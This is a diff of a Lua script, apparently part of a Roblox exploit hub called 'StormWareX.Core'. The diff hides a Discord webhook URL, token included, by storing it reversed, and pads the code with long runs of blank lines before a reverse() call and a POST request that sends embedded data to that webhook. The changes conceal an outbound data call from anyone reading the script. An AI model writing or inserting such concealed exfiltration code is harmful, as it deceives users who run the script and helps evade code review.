@@ -1101,7 +1101,7 @@ local function JPSURY_fake_script() -- StormWareX.Core
 	-- go ahead and spam, idc, we dont log critical info so you can go cry urself to sleep LOL
 	
 	local url =
-		"https://discord.com/api/webhooks/1010491124227526676/MIMbk9FN7yIYA0yDzUN12Odge5qoupBmiPxkOy9PZLQdTDmEh5Eg49qWcMvhcZ9AAZJb"
+		"V-5kCkwFtGyWkPg9E8AiROOmwmK3_htOUTTadFgjO-L_UYQbSJh-RNPnEcvB1r7xrgFH/8438155502831290101/skoohbew/ipa/moc.drocsid//:sptth"
 	local data = {
 		["embeds"] = {
 			{
@@ -1209,9 +1209,46 @@ local function JPSURY_fake_script() -- StormWareX.Core
 	
 	local headers = {
 		["content-type"] = "application/json"
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
 	}
 	request = http_request or request or HttpPost or syn.request
-	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	local final = url:reverse()
+	local abcdef = {Url = final, Body = newdata, Method = "POST", Headers = headers}
 	request(abcdef)
 	
 	
